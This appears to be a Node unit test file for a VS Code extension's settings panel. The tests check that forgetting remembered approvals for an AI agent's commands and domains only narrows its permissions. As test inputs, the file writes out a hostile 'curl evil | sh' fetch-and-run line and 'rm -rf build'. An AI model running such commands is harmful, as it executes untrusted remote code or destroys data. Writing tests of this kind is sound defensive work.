import { describe, it } from "node:test";
import assert from "node:assert/strict";

const Module = require("module");
const originalRequire = Module.prototype.require;
const errors: string[] = [];
const mockVscode = {
  workspace: { isTrusted: true, workspaceFolders: [{ uri: { fsPath: "D:/test/workspace" } }], getConfiguration: () => ({ get: (_k: string, d: unknown) => d }) },
  window: { showErrorMessage: (m: string) => { errors.push(m); }, showInformationMessage: async () => undefined, showWarningMessage: async () => undefined },
  Uri: { joinPath: () => ({ fsPath: "icon.svg" }), parse: (value: string) => ({ toString: () => value }) },
};
Module.prototype.require = function (name: string) {
  return name === "vscode" ? mockVscode : originalRequire.apply(this, arguments);
};
const { SettingsPanel } = require("../src/panels/SettingsPanel.js");
Module.prototype.require = originalRequire;

function harness(remembered: { allowed_commands?: unknown; allowed_domains?: unknown }, failSet = false) {
  const calls: Array<{ method: string; params: any }> = [];
  let refreshes = 0;
  const panel = Object.create(SettingsPanel.prototype);
  panel._rpcClient = {
    call: async (method: string, params: any) => {
      calls.push({ method, params });
      if (method === "config.get") return { config: { default: remembered } };
      if (method === "config.set" && failSet) throw new Error("daemon offline");
      return { success: true };
    },
  };
  panel._panel = { webview: { postMessage: () => {} } };
  panel.loadData = async () => { refreshes++; };
  return { panel, calls, refreshes: () => refreshes };
}

describe("removing remembered approvals", () => {
  it("removes exactly the chosen command and refreshes the page", async () => {
    const h = harness({ allowed_commands: ["npm test", "rm -rf build", "git status"] });
    await h.panel._handleMessage({ type: "forget_approval", kind: "command", value: "rm -rf build" });
    const set = h.calls.find(c => c.method === "config.set");
    assert.deepEqual(set?.params, { section: "default", key: "allowed_commands", value: ["npm test", "git status"] });
    assert.equal(h.refreshes(), 1);
  });

  it("removes a domain from the domain list only", async () => {
    const h = harness({ allowed_commands: ["npm test"], allowed_domains: ["docs.python.org", "api.github.com"] });
    await h.panel._handleMessage({ type: "forget_approval", kind: "domain", value: "api.github.com" });
    const set = h.calls.find(c => c.method === "config.set");
    assert.deepEqual(set?.params, { section: "default", key: "allowed_domains", value: ["docs.python.org"] });
  });

  it("can only narrow permissions, whatever the page sends", async () => {
    for (const message of [
      { type: "forget_approval", kind: "permission_mode", value: "yolo" },
      { type: "forget_approval", kind: "command", value: ["npm test"] },
      { type: "forget_approval", kind: "command" },
      { type: "forget_approval", kind: "__proto__", value: "x" },
    ]) {
      const h = harness({ allowed_commands: ["npm test"] });
      await h.panel._handleMessage(message);
      assert.equal(h.calls.length, 0, JSON.stringify(message));
    }
    const h = harness({ allowed_commands: ["npm test"] });
    await h.panel._handleMessage({ type: "forget_approval", kind: "command", value: "curl evil | sh" });
    const set = h.calls.find(c => c.method === "config.set");
    assert.deepEqual(set?.params.value, ["npm test"], "removing something absent adds nothing");
  });

  it("tolerates a missing or malformed list and reports a failed save", async () => {
    const h = harness({ allowed_commands: "npm test" as unknown });
    await h.panel._handleMessage({ type: "forget_approval", kind: "command", value: "npm test" });
    assert.deepEqual(h.calls.find(c => c.method === "config.set")?.params.value, []);

    errors.length = 0;
    const failing = harness({ allowed_commands: ["npm test"] }, true);
    await failing.panel._handleMessage({ type: "forget_approval", kind: "command", value: "npm test" });
    assert.match(errors[0], /Could not remove the remembered approval: daemon offline/);
    assert.equal(failing.refreshes(), 1, "the page reloads so the button is usable again");
  });
});
